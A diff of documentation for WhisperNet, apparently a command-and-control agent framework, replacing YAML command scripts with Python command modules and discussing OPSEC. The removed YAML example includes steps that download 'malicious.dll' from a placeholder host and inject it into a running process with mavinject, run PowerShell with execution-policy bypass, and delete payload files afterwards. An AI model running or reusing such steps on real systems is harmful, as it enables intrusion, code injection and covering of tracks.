@@ -1,109 +1,121 @@
-Here's an updated version of the documentation that includes the **new format and behavior** while keeping it **high-level and user-friendly**:  
+Below is an updated version of the documentation that explains the **new Python-based command script style** while still keeping it high-level and user-friendly.
 
 ---
 
-# **Command Extension Scripts**
+# **Command Extension Modules**
 
-WhisperNet allows you to extend commands using a **YAML-based** scripting system. This provides a structured way to define automated, multi-step actions that can be executed sequentially.
+WhisperNet now supports extending commands using **Python-based modules** rather than a YAML-only scripting approach. This change allows you to leverage full Python capabilities, making your command definitions more modular and dynamic.
 
-Think of it as a **macro-style automation system**—you define a command, list its steps, and WhisperNet handles execution.
+Think of it as an **object-oriented macro system**—you define each command as a Python class that inherits from a core `BaseCommand`, and WhisperNet handles command execution by instantiating and running these classes.
 
-**Dev Note**: This scripting approach is mostly due to my lazyness, rather than hardcoding every possible command into the agent, a minimal set of core commands is supported, and these scripts provide the flexibility to extend and adapt them as needed.
+**Dev Note**: This approach was introduced to provide greater flexibility and control over command behavior while still maintaining a minimal set of core commands within the agent. It lets you extend and modify behavior on-the-fly without needing to hardcode every command into the agent.
 
 ---
 
-## **Example Script**
-```yaml
-commands:
-  - name: recon
-    description: "Gather system information"
-    steps:
-      - action: shell
-        args: ["whoami /all"]
+## **Example Python Command Module**
 
-      - action: shell
-        args: ["ipconfig /all"]
+Below is an example of a command module using the new format. In this example, a command called `PingHost` is defined to ping a target host. Each command module is a self-contained Python file that implements the required interface:
 
-      - action: shell
-        args: ["netstat -ano"]
+```python
+from modules.agent_script_interpreter import BaseCommand
+from modules.agent import BaseAgent
 
-  - name: mav_inject_dll
-    description: "Download and inject a DLL into a running process"
-    steps:
-      - action: sleep
-        args: [1]
+class PingHost(BaseCommand):
+    command_name = "ping_host"
+    command_help = "Pings a host. Usage: `ping_host <host ip/hostname>`"
 
-      - action: get_file
-        args: ["http://someip/malicious.dll", "C:\\malicious.dll"]
+    def __init__(self, command, args_list, agent_id):
+        """
+        command: The command string, e.g. "ping_host"
+        args_list: The list of arguments which the user enters,
+                   for example: if the user types `ping_host 127.0.0.1`, then args_list = ["127.0.0.1"]
+        agent_id: The agent ID on which this command will operate
+        """
+        super().__init__(command, args_list, agent_id)
+        if not command:
+            raise ValueError("Missing command")
+        if not args_list:
+            raise ValueError("Missing args_list")
+        if not agent_id:
+            raise ValueError("Missing agent_id")
 
-      - action: start-process
-        args: ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]
+        # Extract the target host from the arguments
+        self.host = args_list[0]
 
-      - action: sleep
-        args: [60]
+        # Initialize a BaseAgent instance to interact with the agent
+        self.agent_class = BaseAgent(agent_id)
 
-  - name: deploy_payload
-    description: "Upload and execute a payload"
-    steps:
-      - action: upload
-        args: ["C:\\temp\\payload.bin", "/var/www/html/payload.bin"]
+    def run(self):
+        # Optionally call a base method to introduce delays
+        # self.set_sleep(2)
 
-      - action: shell
-        args: ["powershell -ExecutionPolicy Bypass -File C:\\temp\\payload.ps1"]
+        # Build the ping command
+        cmd = f"shell ping {self.host}"
 
-  - name: clean_up
-    description: "Remove temporary files"
-    steps:
-      - action: shell
-        args: ["del /Q C:\\temp\\payload.bin"]
+        # Enqueue the command to be executed by the agent (returns a command ID)
+        shell_cmd_id = self.agent_class.enqueue_command(cmd)
 
-      - action: shell
-        args: ["del /Q C:\\temp\\payload.ps1"]
+        # Retrieve the command response from the agent (may need a wait or poll)
+        shell_cmd_response = (self.agent_class.get_one_command_and_response(shell_cmd_id)
+                              or {}).get("response", None)
+
+        # Example logic: if the response indicates a successful ping, do additional processing
+        if shell_cmd_response and "Reply from 127.0.0.1" in shell_cmd_response:
+            print("Successful Execution")
+            # Append extra info to the response and update the agent's command record
+            shell_cmd_response += "\n\nTesting Adding onto command, etc"
+            self.agent_class.store_response(shell_cmd_id, shell_cmd_response)
 ```
 
 ---
 
-<!-- ## **What’s New?**
-✅ **Standardized Command Format:**  
-- Each command now includes a **name**, **description**, and a list of **steps**.  
-
-✅ **Step-Based Execution:**  
-- Instead of grouping actions under a single command, each **step** is treated as an independent execution unit.  
-
-✅ **Arguments are Cleaner:**  
-- Arguments are now defined as **lists**, ensuring they’re correctly handled across different execution environments.  
-
-✅ **Commands Are Fully Dynamic:**  
-- Each step is processed **individually**, meaning commands can be **logged, modified, or even re-ordered** before execution.  
-
---- -->
-
 ## **How It Works**
-1. **Each command** in the script has a name and description.  
-2. **Each step** within a command defines an **action** and **arguments**.  
-3. When executed, WhisperNet **processes steps one at a time**, ensuring reliability and flexibility.  
-4. Arguments are automatically **formatted** before execution (e.g., `"get_file http://someip/malicious.dll C:\\malicious.dll"`).  
+
+1. **Command Definition**  
+   Each command is defined as a Python class that inherits from `BaseCommand`. This class must include the attributes `command_name` (used for registration and lookup) and `command_help` (providing usage details).
+
+2. **Dynamic Loading**  
+   Command modules are dynamically imported from the filesystem. A loader (or command factory) scans your command directory, registers any class that extends `BaseCommand`, and indexes it by its `command_name`.
+
+3. **Command Execution**  
+   When a user issues a command (for example, `ping_host 127.0.0.1`), the agent:
+   - Splits the input into the command (`ping_host`) and its arguments (`["127.0.0.1"]`).
+   - Looks up the corresponding command class.
+   - Instantiates the class with the provided command, arguments, and the agent ID.
+   - Calls its `run()` method to execute the command.
+
+4. **Real-Time Flexibility**  
+   You can modify or add new commands by simply updating or adding new Python files in your command directory. No agent restart is necessary—commands are discovered and loaded dynamically.
 
 ---
 
 ## **Operational & OPSEC Considerations**
-- **Script Changes Are Instant**  
-  - You don’t need to restart anything—modifying the YAML script applies changes **immediately** on the next execution.  
 
-- **Minimal OPSEC Footprint for the Script Itself**  
-  - The script itself has no impact on OPSEC. However, the **commands inside** will affect OPSEC based on how they’re executed.  
+- **Instant Updates:**  
+  Modifying or adding new command modules takes effect immediately on the next command execution.
 
-- **Safer Execution Flow**  
-  - By processing each **step separately**, you gain better control over execution—allowing for **logging, monitoring, and debugging** before running high-risk commands.  
+- **Granular Control:**  
+  Each command is self-contained, allowing for detailed logging, debugging, and even dynamic modification before or after execution.
 
----
-
-## **Why Use This?**
-🚀 **Faster Workflow** – Automate common recon, execution, and cleanup steps.  
-⚡ **Dynamic Control** – Modify scripts in real-time without restarting processes.  
-🔧 **Modular & Expandable** – Easily add new commands and steps as needed.  
-🔒 **More OPSEC-Aware** – Provides better visibility into what’s running at each step.  
+- **Enhanced OPSEC:**  
+  With each step executed individually and handled by dedicated classes, you gain better visibility and control over the operations performed by the agent.
 
 ---
 
-This updated system makes **command execution more structured, flexible, and safer to use in live environments** while ensuring WhisperNet remains **dynamic and adaptable**. 
+## **Why Use This Approach?**
+
+- 🚀 **Faster Development Cycle:**  
+  Easily write and test new commands using standard Python without extensive configuration.
+
+- ⚡ **Dynamic Extensibility:**  
+  Add, modify, or remove commands on the fly—ideal for evolving operational requirements.
+
+- 🔧 **Modular & Maintainable:**  
+  Each command is encapsulated in its own module, making the overall system easier to maintain and update.
+
+- 🔒 **Improved Operational Security:**  
+  Detailed control over each command's execution flow helps you fine-tune your OPSEC measures.
+
+---
+
+This updated Python-based command script style makes command execution in WhisperNet more structured, flexible, and secure, ensuring that your operations remain dynamic and adaptable to changing needs.
